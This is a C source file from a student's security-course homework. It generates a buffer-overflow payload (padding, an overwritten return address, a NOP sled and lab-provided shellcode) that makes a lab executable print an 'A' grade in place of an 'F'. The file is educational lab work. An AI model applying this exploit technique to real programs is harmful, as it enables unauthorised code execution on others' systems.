// Adam Marcus aem2nj
// attack-gradeA.c
// CS4630 Homework 1
// This file creates a text file used to carry out a buffer overflow attack on an unknown executable to change
// what the executable prints out from "F" to "A" for the student's grade
#include <stdio.h>
#include <string.h>
/*
rsp = 0x7fffffffbdc0 (overflow start)
rip = 0x7fffffffddc8 (address to overwrite) malicious insertion point
rip – rsp = 8200
BREAKDOWN:
8200 garbage bytes
8 byte malicious address
NOP sled of arbitrary length (mine is 10000)
Shellcode
*/
int main(void){

  // creates a NOP sled of size 10000
  // NOP sled is an arbitrary length greater than the buffer size of 8200
  char buffer[10000];
  memset(buffer, 0x90, 10000);

  // the address below was arbitrarily picked to be just after
  // the malicious insertion point near the middle of the NOP sled
  char addr[] = "\xfa\xde\xff\xff\xff\x7f\x00\x00"; //0x00007fffffffdefa
  
  // This shellcode was provided in the lab
  // I used the provided python to c method to get this array
  unsigned char shellcode[] = {// shellcode as an array
  0x48, 0x8d, 0x25, 0xf9, 0xfe, 0xff, 0xff, 0x48, 0x8d, 0x3d, 0x0d, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x35, 0x12, 0x00, 0x00, 0x00, 0x68, 0x30, 0x0c, 0x40, 0x00, 0xc3, 0x41, 0x64, 0x61, 0x6d, 0x20, 0x4d, 0x61, 0x72, 0x63, 0x75, 0x73, 0x00, 0x41, 0x00};

  
  for(int i = 0; i < 8; i++){// Inserting the address (from lab writeup)
    buffer[8200+i]=addr[i];
  }
  
  for(int i = 0; i < sizeof(shellcode); i++){// Inserting the shellcode (from lab writeup)
    buffer[sizeof(buffer) - sizeof(shellcode) + i] = shellcode[i];
  }

  // Opens and writes the exploit to data.txt
  FILE *exploitFile;
  exploitFile = fopen("data.txt", "w");
  fwrite(buffer, sizeof(buffer), 1, exploitFile);
  fclose(exploitFile);
  
  return 0;
}
